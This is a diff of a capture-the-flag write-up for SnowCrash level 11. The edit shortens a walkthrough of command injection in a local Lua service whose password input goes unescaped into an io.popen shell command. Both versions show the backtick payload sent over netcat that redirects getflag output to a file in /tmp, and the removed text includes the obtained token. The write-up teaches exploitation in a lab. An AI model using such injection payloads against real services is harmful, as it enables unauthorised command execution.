@@ -1,62 +1,31 @@
 # Level 11
 
-There is a Lua file. When executing it, you get the following:
+Another command injection, this time in Lua service.
 
-```
-level11@SnowCrash:~$ lua level11.lua
-lua: level11.lua:3: address already in use
-stack traceback:
- [C]: in function 'assert'
- level11.lua:3: in main chunk
- [C]: ?
-```
-
-It crashes at these lines:
+It does:
 
 ```lua
-local socket = require("socket")
-local server = assert(socket.bind("127.0.0.1", 5151))
+io.popen("echo " .. pass .. " | sha1sum", "r")
 ```
 
-The server is already running in the background. Let's use `netcat` to connect to it directly:
+No escaping on pass.
 
-```
-level11@SnowCrash:~$ nc 127.0.0.1 5151
-Password:
-```
+Connect:
 
-We're in. Now, looking closer at the source, the password we send gets passed straight into a shell command without any sanitization:
-
-```lua
-prog = io.popen("echo "..pass.." | sha1sum", "r")
+```bash
+nc 127.0.0.1 5151
 ```
 
-Whatever we type is interpolated directly into `echo <input> | sha1sum`. We can abuse this to inject our own shell commands. Let's try calling `getflag`:
+Send payload:
 
-```
-level11@SnowCrash:~$ nc 127.0.0.1 5151
-Password: getflag
-Erf nope..
+```text
+Password: `getflag` > /tmp/flag11.txt
 ```
 
-The output isn't returned to us. It just gets piped into `sha1sum`. We need to redirect it somewhere we can read it:
+Then read:
 
-```
-level11@SnowCrash:~$ nc 127.0.0.1 5151
-Password: getflag > /tmp/exploit
-Erf nope..
-level11@SnowCrash:~$ cat /tmp/exploit
-getflag
+```bash
+cat /tmp/flag11.txt
 ```
 
-Close, but `getflag` is being treated as a literal string rather than a command. We need to wrap it in backticks so the shell evaluates it first:
-
-```
-level11@SnowCrash:~$ nc 127.0.0.1 5151
-Password: `getflag` > /tmp/exploit
-Erf nope..
-level11@SnowCrash:~$ cat /tmp/exploit
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
-```
-
-There you go!
+Same pattern as before: user input concatenated into shell command.
